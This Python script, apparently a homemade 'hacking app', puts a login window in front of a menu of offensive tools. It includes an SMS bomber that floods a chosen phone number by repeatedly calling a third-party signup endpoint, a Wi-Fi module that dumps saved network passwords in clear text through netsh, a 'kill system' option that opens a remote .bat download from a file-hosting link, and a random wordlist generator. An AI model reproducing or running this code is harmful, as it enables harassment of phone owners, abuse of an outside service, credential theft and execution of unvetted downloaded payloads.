from os import system
from tkinter import *
from datetime import *
from requests import *
from random import *
from base64 import *
from time import sleep
from sys import stdout
import webbrowser
import subprocess

logo = """\033[33m
       ▄█    █▄       ▄████████  ▄████████    ▄█   ▄█▄  ▄█  ███▄▄▄▄      ▄██████▄        ▄████████    ▄████████    ▄████████  
      ███    ███     ███    ███ ███    ███   ███ ▄███▀ ███  ███▀▀▀██▄   ███    ███      ███    ███   ███    ███   ███    ███       
      ███    ███     ███    ███ ███    █▀    ███▐██▀   ███▌ ███   ███   ███    █▀       ███    ███   ███    ███   ███    ███ 
     ▄███▄▄▄▄███▄▄   ███    ███ ███         ▄█████▀    ███▌ ███   ███  ▄███             ███    ███   ███    ███   ███    ███ 
    ▀▀███▀▀▀▀███▀  ▀███████████ ███        ▀▀█████▄    ███▌ ███   ███ ▀▀███ ████▄     ▀███████████   █████████▀   █████████▀ 
      ███    ███     ███    ███ ███    █▄    ███▐██▄   ███  ███   ███   ███    ███      ███    ███   ███          ███      
      ███    ███     ███    ███ ███    ███   ███ ▀███▄ ███  ███   ███   ███    ███      ███    ███   ███          ███         
      ███    █▀      ███    █▀  ████████▀    ███   ▀█▀ █▀    ▀█   █▀    ████████▀       ███    █▀    ███          ███       
                                             ▀                                                                                                         
                                    \033[34m[✔]             Version 1.1.5               [✔]
                                    \033[34m[*]        Hacking app create by Sina       [*]
\033[97m """

class color:
    black="\033[0;30m"
    red="\033[0;31m"
    bred="\033[1;31m"
    green="\033[0;32m"
    bgreen="\033[1;32m"
    yellow="\033[0;33m"
    byellow="\033[1;33m"
    blue="\033[0;34m"
    bblue="\033[1;34m"
    purple="\033[0;35m"
    bpurple="\033[1;35m"
    cyan="\033[0;36m"
    bcyan="\033[1;36m"
    bold = "\033[1;37m"
    white="\033[0;37m"

setting_pwd = {'passwords':500,'lenpassword':6}

def sprint(text, second=0.05):
    for line in text + '\n':
        stdout.write(line)
        stdout.flush()
        sleep(second)

def info() :
    system("cls")
    print(logo)
    start()

def start() :
    print("[1 kill system")
    print("[2 window bomb")
    print("[3 sms bomber")
    print("[4 wifi hack")
    print("[5 wordlist generate")
    print("[99] back to exit")
    try:
        a = int(input("\nselect a option ==> "))
    except ValueError:
        sprint(f"{color.red}\n[!] Please enter only numbers\n")  
        input("press ENTER to Exit :")
        exit()

    if a == 1 :
        kill()
    elif a == 2 :
        bomb()
    elif a == 3:
        sms()
    elif a == 4 :
        wifi()
    elif a == 5 :
        pwd()
    elif a == 99:
        exit()
    else:
        print("\033[91m\nErorr")
        input(f"\n{color.white}Press ENTER to continue : ")
        system("cls")
        print(logo)
        start()
def kill() :
    system("cls")
    print(logo)
    print("[1 Link download")
    print("[2 install")
    print("[99] back to all tools \n")
    try:
        a = int(input("select a mode ==> "))
    except ValueError:
        sprint(f"{color.red}\n[!] Please enter only numbers\n")
        
        input("press ENTER to Exit :")
        exit()
    if a == 1 :
        print("Link download :\033[34mhttps://download1638.mediafire.com/1sqt3nhi7zogou-IB8VOCfhCbKUr_Ye6cjj5YNaual2mOrgdr-X1PusoWQiVG5x-d8cpdhsp4S8reoNkNeGIjukPa7Hi1ypSq0JjMsvLMtWE8sCvTir2qZzhKl3RhMHDgTVmltnb4IdzPW3t8Zo65-62Vc90gO54iVKBUt5YQ5vcTA/m79n3cjmvmzat9g/file.bat")
        input(f"\n{color.white}Press ENTER to continue : ")
        kill()
    elif a == 2 :
        webbrowser.open_new_tab("https://download1638.mediafire.com/1sqt3nhi7zogou-IB8VOCfhCbKUr_Ye6cjj5YNaual2mOrgdr-X1PusoWQiVG5x-d8cpdhsp4S8reoNkNeGIjukPa7Hi1ypSq0JjMsvLMtWE8sCvTir2qZzhKl3RhMHDgTVmltnb4IdzPW3t8Zo65-62Vc90gO54iVKBUt5YQ5vcTA/m79n3cjmvmzat9g/file.bat")
        input(f"\n{color.white}Press ENTER to continue : ")
        kill()
    elif a == 99 :
        system("cls")
        info()
    else:
        print("\033[91m\nErorr")
        input(f"\n{color.white}Press ENTER to continue : ")
        system("cls")
        kill()
def bomb() :
    system("cls")
    print(logo)
    print("[1 Link download")
    print("[99] back to all tools \n")
    try:
        a = int(input("select a mode ==> "))
    except ValueError:
        sprint(f"{color.red}\n[!] Please enter only numbers\n")
        
        input("press ENTER to Exit :")
        exit()
    if a == 1 :  
        input(f"\n{color.white}Press ENTER to continue : ")
        info()
    elif a == 99 :
        system("cls")
        info()
    else:
        print("\033[91m\nErorr")
        input(f"\n{color.white}Press ENTER to continue : ")
        bomb()
def sms() :
    system("cls")
    print(logo)
    print("[1 Run")
    print("[99] back to all tools \n")
    try:
        a = int(input("select a mode ==> "))
    except ValueError:
        sprint(f"{color.red}\n[!] Please enter only numbers\n")
        
        input("press ENTER to Exit :")
        exit()
    if a == 1 :
        Enter = input("\n[~] Enter a cellphone : ")
        n = int(input("[~] Enter a range : "))
        attestation ={
        "cellphone": "+98"+Enter
        }
        url = "https://core.gap.im/v1/user/add.json?mobile="+Enter
        for sms in range(n+2):
            try:
                sms = post(url, data=attestation)  
            except:
                print(color.red+"\n[!] Error check your connection")
                input(f"\n{color.white}Press ENTER to Exit : ")
                sms()
        input(f"\n{color.white}Press ENTER to continue : ")
        info()
    elif a == 99 :
        system("cls")
        info()
    else:
        print("\033[91m\nErorr")
        input(f"\n{color.white}Press ENTER to continue : ")
        sms()
def wifi() :
    system("cls")
    print(logo)
    print("[1 Run")
    print("[99] back to all tools \n")
    try:
        a = int(input("select a mode ==> "))
    except ValueError:
        sprint(f"{color.red}\n[!] Please enter only numbers\n")
        
        input("press ENTER to Exit :")
        exit()
    if a == 1 :
        system("cls")
        print(logo)
        command_one = "netsh wlan show profiles"
        var = "All User Profile"
        a = subprocess.check_output(command_one.split(" ")).decode('utf-8').split('\n')
        a = [i for i in a if "All User Profile" in i]
        for i in a:
            t = i.split(':')[1].replace('\n','')
            t = t.strip()
            try:
                resault = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', t, 'key=clear']).decode('utf-8').split('\n')
                resault = [b.split(":")[1][1:-1] for b in resault if "Key Content" in b]
                end = str(resault).split("Key Content")
                print(t,":",end[0][2:-2])
            except:
                print(t+" : Error get password")
        input(f"\n{color.white}Press ENTER to continue : ")
        wifi()
    elif a == 99 :
        system("cls")
        info()
    else:
        print("\033[91m\nErorr")
        input(f"\n{color.white}Press ENTER to continue : ")
        wifi()
def pwd():
    global setting_pwd
    pchr = "abcdefghijklmnopqrstuvwxyz123456789@!~$%^&*()"
    pnum = "0123456789"
    pkal = "abcdefghijklmnopqrstuvwxyz"
    system("cls")
    print(logo)
    print("[1 password number (16582)")
    print("[2 password char (smpwc)")
    print("[3 password char2 (h4x@$)")
    print("[4 setting_pwd")
    print("[99] back to all tools \n")
    try:
        a = int(input("select a mode ==> "))
    except ValueError:
        sprint(f"{color.red}\n[!] Please enter only numbers\n")
        
        input("press ENTER to Exit :")
        exit()
    if a == 1 :
        load = color.cyan+"loading : "
        name = input("\nEnter a name for password list (*.txt): ")
        pali = open(name, "w")
        pwd_list = list(pnum) 
        for y in range(setting_pwd['passwords']):
            password = ""
            for i in range(setting_pwd['lenpassword']):
                password += choice(pwd_list)
            pali.write(password+'\n')
            if y % 3 == 0 and y < 450 :
                load += "█"
                system("cls")
                print(load)
        sleep(0.3)
        system("cls")
        print("\nfinished!")
        pali.close()
        input(f"\n{color.white}Press ENTER to continue : ")
        pwd()
    if a == 2 :
        load = color.cyan+"loading : "
        name = input("\nEnter a name for password list (*.txt): ")
        pali = open(name, "w")
        pwd_list = list(pkal) 
        for y in range(setting_pwd['passwords']):
            password = ""
            for i in range(setting_pwd['lenpassword']):
                password += choice(pwd_list)
            pali.write(password+'\n')
            if y % 3 == 0 and y < 450 :
                load += "█"
                system("cls")
                print(load)
        sleep(0.3)
        system("cls")
        print("\nfinished!")
        pali.close()
        input(f"\n{color.white}Press ENTER to continue : ")
        pwd()
    if a == 3 :
        load = color.cyan+"loading : "
        name = input("\nEnter a name for password list (*.txt): ")
        pali = open(name, "w")
        pwd_list = list(pchr) 
        r = setting_pwd['passwords']
        for y in range(r):
            password = ""
            for i in range(setting_pwd['lenpassword']):
                password += choice(pwd_list)
            pali.write(password+'\n')
            if y % 3 == 0 and y < 450 :
                load += "█"
                system("cls")
                print(load)
        sleep(0.3)
        system("cls")
        print("\nfinished!")
        pali.close()
        input(f"\n{color.white}Press ENTER to continue : ")
        pwd()
    elif a == 4 :
        system("cls")
        print(logo)
        print(setting_pwd)
        print("\n[1 change passwords (range)")
        print("[2 change len password")
        print("[99] back to password list")
        a = int(input("\nselect a option => "))
        if a == 1 :
            system("cls")
            print(logo)
            setting_pwd['passwords'] = int(input("Enter a range passwords => "))
            input(f"\n{color.white}Press ENTER to continue : ")
            pwd()
        elif a == 2 :
            system("cls")
            print(logo)
            setting_pwd['lenpassword'] = int(input("Enter a range passwords => "))        
            input(f"\n{color.white}Press ENTER to continue : ")
            pwd()
        elif a == 99 :
            system("cls")
            pwd()
        else:
            print("\033[91m\nErorr")
            input(f"\n{color.white}Press ENTER to continue : ")
            pwd()
    elif a == 99 :
        system("cls")
        info()
    else:
        print("\033[91m\nErorr")
        input(f"\n{color.white}Press ENTER to continue : ")
        pwd()
def program_exists(program):
    try:
        subprocess.run(['where', program], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        return False
    return not (txt[1].strip() == '' or txt[1].find('no %s in' % program) != -1)
def verifi():
    now = datetime.now()
    username = username_entry.get()
    password = password_entry.get()
    pwd = (now.strftime("%M")*2)+now.strftime("%H")
    if program_exists("user.txt"):
        a = open("user.txt", "r") 
        if password == pwd and username == b64decode(a.read()).decode('utf-8'):
            root.destroy()
            info()
            a.close()
    else:
        a = open("user.txt", "w")
        user = b64encode(username.encode('utf-8')).decode('utf-8')
        if password == pwd:
            a.write(user)
            root.destroy()
            info()
            a.close()


root = Tk()
root.title("hacking app")
root.geometry("350x320")
frame = Frame(root)
frame.pack(pady=20)
username_label = Label(frame, text="username", font=("Helvetica", 12))
username_label.grid(row=0, column=0, padx=5, pady=5)
username_entry = Entry(frame, font=("Helvetica", 12))
username_entry.grid(row=1, column=0, padx=5, pady=10)
password_label = Label(frame, text="password", font=("Helvetica", 12))
password_label.grid(row=2, column=0, padx=5, pady=5)
password_entry = Entry(frame, show="*", font=("Helvetica", 12))
password_entry.grid(row=3, column=0, padx=5, pady=5)
verifi_button = Button(root, text="Login", command=verifi, font=("Helvetica", 12))
verifi_button.pack()
registration_label = Label(root, text="", font=("Helvetica", 12))
registration_label.pack()
verifi_label = Label(root, text="", font=("Helvetica", 12))
verifi_label.pack()
root.mainloop()
